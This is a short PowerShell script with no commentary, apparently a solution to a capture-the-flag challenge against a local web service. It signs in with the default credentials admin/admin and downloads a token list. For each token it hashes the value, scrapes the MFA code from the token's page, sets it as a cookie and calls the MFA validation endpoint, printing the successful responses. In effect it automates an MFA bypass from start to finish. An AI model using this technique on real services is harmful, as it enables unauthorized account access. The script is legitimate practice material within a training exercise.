$creds = New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "admin" -AsPlainText -Force))
$cookieContainer = New-Object System.Net.CookieContainer

$response = iwr http://127.0.0.1:1225/token_overview.csv -Credential $creds -AllowUnencryptedAuthentication
$content_array = $response -split "\n"

$cookie = New-Object System.Net.Cookie
$cookie.Name = "token"
$cookie.Value = "5f8dd236f862f4507835b0e418907ffc"
$cookie.Domain = "127.0.0.1"
$cookieContainer.Add($cookie)

foreach ($line in $content_array) {
    if (-Not $line.StartsWith("#") -and -Not $line.startsWith("file_MD5hash")) {
        $line = ($line -Split ",")[0]
        $token_cookie = New-Object System.Net.Cookie
        $token_cookie.Name = "token"
        $token_cookie.Value = $line
        $token_cookie.Domain = "127.0.0.1"
        $cookieContainer.Add($token_cookie)
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession -Property @{ Cookies = $cookieContainer }

        $string = "$line`n"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($string)
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $hashBytes = $sha256.ComputeHash($bytes)
        $hashString = -join ($hashBytes | ForEach-Object { $_.ToString("x2") })

        $response = Invoke-WebRequest -Uri http://127.0.0.1:1225/tokens/$hashString -Credential $creds -AllowUnencryptedAuthentication -WebSession $session
        ($response.Content -match "href='([^']+)'") | Out-Null
        $mfaCode = $matches[1]

        $mfaCookie = New-Object System.Net.Cookie
        $mfaCookie.Name = "mfa_token"
        $mfaCookie.Value = "$mfaCode"
        $mfaCookie.Domain = "127.0.0.1"

        $cookieContainer.Add($mfaCookie)

        $validateUrl = "http://127.0.0.1:1225/mfa_validate/$hashString"
        $response = Invoke-WebRequest -Uri $validateUrl -WebSession $session -Credential $creds -AllowUnencryptedAuthentication
        if (-Not $response.Content.Contains("ERROR")) {
            echo "$response"
        }
    }
}